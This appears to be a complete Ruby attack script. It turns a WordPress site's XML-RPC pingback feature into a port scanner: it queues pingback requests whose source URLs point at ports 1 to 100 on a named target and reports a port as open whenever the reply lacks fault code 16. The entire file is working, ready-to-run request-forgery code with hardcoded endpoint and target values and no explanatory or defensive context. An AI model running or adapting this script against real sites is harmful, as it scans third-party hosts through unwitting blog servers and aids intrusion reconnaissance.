require "typhoeus"

def generate_pingback_xml (target, valid_blog_post)
  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
  xml << "<methodCall>"
  xml << "<methodName>pingback.ping</methodName>"
  xml << "<params>"
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << "</params>"
  xml << "</methodCall>"
  xml
end

def generate_requests(hydra, xml_rpc, valid_blog_post, target)
  (1..100).each do |i|
    random = (0...8).map{65.+(rand(26)).chr}.join
    url = "#{target}:#{i}/#{random}/"
    xml = generate_pingback_xml(url, valid_blog_post)
    request = Typhoeus::Request.new(xml_rpc, :body => xml, :method => :post)
    request.on_complete do |response|
      # Closed: <value><int>16</int></value>
      closed_match = response.body.match(/<value><int>16<\/int><\/value>/)
      if closed_match.nil?
        puts "Port #{i} is open"
      end
    end
    hydra.queue(request)
  end
end

hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
xml_rpc = "http://portscanner/xmlrpc.php"
valid_blog_post = "http://portscanner/blogpost"
target = "http://www.firefart.net"
generate_requests(hydra, xml_rpc, valid_blog_post, target)
hydra.run
